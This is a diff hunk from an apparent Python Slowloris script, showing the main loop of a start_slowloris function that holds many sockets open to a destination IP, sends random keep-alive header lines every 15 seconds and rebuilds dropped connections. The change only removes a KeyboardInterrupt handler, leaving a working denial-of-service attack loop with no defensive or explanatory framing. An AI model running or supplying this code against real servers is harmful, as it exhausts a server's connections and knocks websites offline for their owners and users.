@@ -61,23 +61,19 @@ def start_slowloris(destination_ip, socket_count):
         list_of_sockets.append(s)
 
     while True:
-        try:
-            print("Sending keep-alive headers... Socket count: " + str(len(list_of_sockets)))
-            for s in list(list_of_sockets):
-                try:
-                    s.send("X-a: {}\r\n".format(randint(1, 5000)).encode("utf-8"))
-                except socket.error:
-                    list_of_sockets.remove(s)
+        print("Sending keep-alive headers... Socket count: " + str(len(list_of_sockets)))
+        for s in list(list_of_sockets):
+            try:
+                s.send("X-a: {}\r\n".format(randint(1, 5000)).encode("utf-8"))
+            except socket.error:
+                list_of_sockets.remove(s)
 
-            for i in range(socket_count - len(list_of_sockets)):
-                print("Recreating socket...")
-                try:
-                    s = build_socket(destination_ip)
-                    if s:
-                        list_of_sockets.append(s)
-                except socket.error:
-                    break
-            sleep(15) # timeout in sending headers, every 15 sec
-        except (KeyboardInterrupt, SystemExit):
-            print("\nStopping Slowloris...")
-            break
+        for i in range(socket_count - len(list_of_sockets)):
+            print("Recreating socket...")
+            try:
+                s = build_socket(destination_ip)
+                if s:
+                    list_of_sockets.append(s)
+            except socket.error:
+                break
+        sleep(15) # timeout in sending headers, every 15 sec
